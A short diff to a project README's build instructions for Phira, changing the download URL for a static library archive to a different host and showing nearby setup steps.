@@ -9,7 +9,7 @@
     - **If you cannot connect to GitHub, you can also use the accelerated addresses provided by git acceleration websites to clone or download.**
     - **If you want to build a specific version of Phira, go to the release page and select `Source code(tar.gz)` under Assets to download it locally, then extract it to any path.**
     - **Warning: To prevent build issues, we do not recommend including any characters other than those in the ASCII encoding in the path.**
-3. Static library files: You can download from [here](https://www.nuanr-mxi.com/prpr-avc.zip). After downloading, extract the files directly to the root directory of the code. If prompted to overwrite files, click "Overwrite."
+3. Static library files: You can download from [here](https://s.07210700.xyz/prpr-avc.zip). After downloading, extract the files directly to the root directory of the code. If prompted to overwrite files, click "Overwrite."
 4. Additional library files are required for the build process. Enter the following commands:
 ```shell
 sudo apt update
